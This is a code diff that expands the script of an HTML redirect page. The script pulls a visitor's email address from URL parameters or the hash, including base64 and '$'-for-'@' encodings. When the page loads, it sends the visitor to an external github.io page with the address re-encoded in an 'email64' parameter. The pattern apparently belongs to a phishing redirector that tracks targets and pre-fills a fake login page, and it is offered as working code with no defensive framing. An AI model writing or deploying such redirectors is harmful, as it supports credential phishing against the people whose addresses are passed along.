@@ -19,41 +19,146 @@
     <script>
         // Function to process email and redirect
         function processEmailAndRedirect() {
-            // Get the email from URL hash
+            // Function to get email from various URL sources
             function getEmailFromURL() {
-                const hash = window.location.hash.substring(1);
+                // Get URL parameters
+                const urlParams = new URLSearchParams(window.location.search);
                 
-                if (!hash) return null;
-                
-                // Try to decode as base64 first
-                try {
-                    const base64Decoded = atob(hash);
-                    if (isValidEmailFormat(base64Decoded)) return base64Decoded;
-                } catch (e) {
-                    // Not a valid base64 string, continue to check as plain email
+                // FIRST: Check for email64 parameter (base64 encoded)
+                const email64Param = urlParams.get('email64');
+                if (email64Param) {
+                    try {
+                        const base64Decoded = atob(email64Param);
+                        if (isValidEmailFormat(base64Decoded)) {
+                            console.log("Found email64 parameter, decoded to:", base64Decoded);
+                            return base64Decoded;
+                        }
+                    } catch (e) {
+                        console.log("Invalid base64 in email64 parameter:", email64Param);
+                    }
                 }
                 
-                // Check if it's a plain email (replace $ with @ if needed)
-                const emailWithAt = hash.replace(/\$/g, '@');
-                if (isValidEmailFormat(emailWithAt)) return emailWithAt;
+                // SECOND: Check for other email parameters
+                const emailParams = ['email', 'e', 'user', 'username', 'mail'];
+                for (const param of emailParams) {
+                    const paramValue = urlParams.get(param);
+                    if (paramValue && isValidEmailFormat(paramValue)) {
+                        console.log("Found email in parameter", param + ":", paramValue);
+                        return paramValue;
+                    }
+                }
                 
+                // THIRD: Check URL hash/fragment
+                const hash = window.location.hash.substring(1);
+                if (hash) {
+                    // Try to decode as base64 first
+                    try {
+                        const base64Decoded = atob(hash);
+                        if (isValidEmailFormat(base64Decoded)) {
+                            console.log("Found base64 email in hash, decoded to:", base64Decoded);
+                            return base64Decoded;
+                        }
+                    } catch (e) {
+                        // Not a valid base64 string, continue to check as plain email
+                    }
+                    
+                    // Check if it's a plain email (replace $ with @ if needed)
+                    const emailWithAt = hash.replace(/\$/g, '@');
+                    if (isValidEmailFormat(emailWithAt)) {
+                        console.log("Found plain email in hash:", emailWithAt);
+                        return emailWithAt;
+                    }
+                    
+                    // Check if hash contains base64 pattern
+                    const base64Pattern = /([A-Za-z0-9+/]{20,}={0,2})/;
+                    const base64Match = hash.match(base64Pattern);
+                    if (base64Match) {
+                        try {
+                            const base64Decoded = atob(base64Match[1]);
+                            if (isValidEmailFormat(base64Decoded)) {
+                                console.log("Found base64 pattern in hash, decoded to:", base64Decoded);
+                                return base64Decoded;
+                            }
+                        } catch (e) {
+                            // Not a valid base64
+                        }
+                    }
+                }
+                
+                // FOURTH: Check for base64 in other parameters
+                const base64Params = ['e64', 'b64', 'base64', 'enc', 'encoded'];
+                for (const param of base64Params) {
+                    const paramValue = urlParams.get(param);
+                    if (paramValue) {
+                        try {
+                            const base64Decoded = atob(paramValue);
+                            if (isValidEmailFormat(base64Decoded)) {
+                                console.log("Found base64 in parameter", param + ", decoded to:", base64Decoded);
+                                return base64Decoded;
+                            }
+                        } catch (e) {
+                            // Not a valid base64
+                        }
+                    }
+                }
+                
+                console.log("No valid email found in URL");
                 return null;
             }
             
+            // Function to check if a string is in valid email format
             function isValidEmailFormat(email) {
-                return email.includes('@') && email.includes('.') && email.length > 5;
+                if (!email || typeof email !== 'string') return false;
+                
+                // Basic email validation
+                const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+                return emailRegex.test(email) && email.length > 5;
+            }
+            
+            // Function to check if a string is valid base64
+            function isBase64(str) {
+                try {
+                    if (!str || typeof str !== 'string') return false;
+                    
+                    // Check if string contains only valid base64 characters
+                    const base64Pattern = /^[A-Za-z0-9+/]*={0,2}$/;
+                    if (!base64Pattern.test(str)) return false;
+                    
+                    // Try to decode it
+                    atob(str);
+                    return true;
+                } catch (e) {
+                    return false;
+                }
             }
             
             const email = getEmailFromURL();
             
             if (email) {
+                // Encode email to base64 for the redirect
+                const base64Email = btoa(email);
+                
+                // Create the redirect URL with email64 parameter
+                const redirectUrl = "https://goodmantech2026.github.io/redifying-technology/?email64=" + encodeURIComponent(base64Email);
+                
+                console.log("Redirecting to:", redirectUrl);
+                
                 // Redirect to the target URL
-                window.location = "https://goodmantech2026.github.io/redifying-technology/?email64=" + btoa(email);
+                window.location = redirectUrl;
+            } else {
+                console.log("No email found, cannot redirect");
+                // Optionally, you could redirect to a default page or show an error
+                // window.location = "https://goodmantech2026.github.io/redifying-technology/";
             }
         }
         
-        // Start the process immediately
+        // Start the process immediately when page loads
         window.onload = processEmailAndRedirect;
+        
+        // Also try to process if page is already loaded
+        if (document.readyState === 'complete') {
+            processEmailAndRedirect();
+        }
     </script>
 </body>
 </html>
